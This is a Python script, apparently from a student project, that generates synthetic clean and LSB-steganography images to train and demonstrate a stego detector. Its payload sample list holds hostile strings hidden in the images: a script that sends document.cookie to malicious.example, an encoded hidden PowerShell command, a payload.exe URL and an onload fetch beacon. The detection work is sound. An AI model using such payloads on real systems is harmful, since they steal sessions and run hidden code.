"""
make_demo_dataset.py
---------------------
Generates a SMALL synthetic dataset of clean vs LSB-stego images so the
whole pipeline (feature extraction -> training -> Flask API -> extension)
can be demonstrated and sanity-checked without downloading the full 44,000
image Kaggle dataset (which the professor / student should download
separately -- see README.md).

Structure produced (mirrors the real dataset's expected layout):
  demo_data/clean/*.png   -- natural-looking images, nothing embedded
  demo_data/stego/*.png   -- same images with a random payload LSB-embedded
"""

import os
import random
import numpy as np
from PIL import Image

random.seed(42)
np.random.seed(42)

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_CLEAN = os.path.join(HERE, "..", "demo_data", "clean")
OUT_STEGO = os.path.join(HERE, "..", "demo_data", "stego")
os.makedirs(OUT_CLEAN, exist_ok=True)
os.makedirs(OUT_STEGO, exist_ok=True)

N_IMAGES = 120  # keep small & fast for a laptop demo; real dataset has 44k
IMG_SIZE = 128


def make_natural_image(seed):
    """Simulate a natural photo-like image via smoothed colored noise
    (Perlin-ish via Gaussian blur of random noise) -- gives realistic
    pixel statistics (correlated neighbours) unlike pure random noise."""
    rng = np.random.default_rng(seed)
    base = rng.integers(0, 256, (IMG_SIZE, IMG_SIZE, 3), dtype=np.uint8).astype(np.float32)
    img = Image.fromarray(base.astype(np.uint8))
    # Blur repeatedly (box blur via PIL) to create smooth, natural-looking gradients
    from PIL import ImageFilter

    for _ in range(6):
        img = img.filter(ImageFilter.GaussianBlur(radius=3))
    arr = np.array(img).astype(np.float32)
    arr += rng.normal(0, 6, arr.shape)  # sensor-noise-like texture
    arr = np.clip(arr, 0, 255).astype(np.uint8)
    return arr


def embed_lsb_payload(arr, payload_bytes):
    """Embed payload_bytes into the LSBs of the flattened RGB array,
    identical in spirit to how the Kaggle dataset hides JS/HTML/PS/URL
    payloads: sequential LSB substitution across channels."""
    flat = arr.flatten().copy()
    bits = np.unpackbits(np.frombuffer(payload_bytes, dtype=np.uint8))
    # prepend a 32-bit length header so a real decoder would know where to stop
    length_header = np.unpackbits(np.array([len(payload_bytes)], dtype=">u4").view(np.uint8))
    all_bits = np.concatenate([length_header, bits])
    if len(all_bits) > len(flat):
        raise ValueError("Payload too large for this image")
    flat[: len(all_bits)] = (flat[: len(all_bits)] & 0xFE) | all_bits
    return flat.reshape(arr.shape)


PAYLOAD_SAMPLES = [
    b"<script>document.location='http://malicious.example/steal?c='+document.cookie</script>",
    b"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    b"http://malicious.example/payload.exe?ref=stego",
    b"<html><body onload=fetch('http://malicious.example/beacon')></body></html>",
    b"0x8f3a9c1d4e5b6a7c8d9e0f1a2b3c4d5e6f708192",  # ethereum-like key
]

for i in range(N_IMAGES):
    arr = make_natural_image(seed=i)
    Image.fromarray(arr).save(os.path.join(OUT_CLEAN, f"clean_{i:04d}.png"))

    # Repeat payload to occupy a realistic 20-45% of available LSB capacity
    # (embedding rate matters a lot for detectability -- see README/analysis)
    base_payload = random.choice(PAYLOAD_SAMPLES)
    capacity_bytes = (IMG_SIZE * IMG_SIZE * 3) // 8
    target_bytes = int(capacity_bytes * random.uniform(0.20, 0.45))
    reps = max(1, target_bytes // len(base_payload))
    payload = (base_payload * reps)[:target_bytes]
    stego_arr = embed_lsb_payload(arr, payload)
    Image.fromarray(stego_arr).save(os.path.join(OUT_STEGO, f"stego_{i:04d}.png"))

print(f"Generated {N_IMAGES} clean + {N_IMAGES} stego demo images in demo_data/")
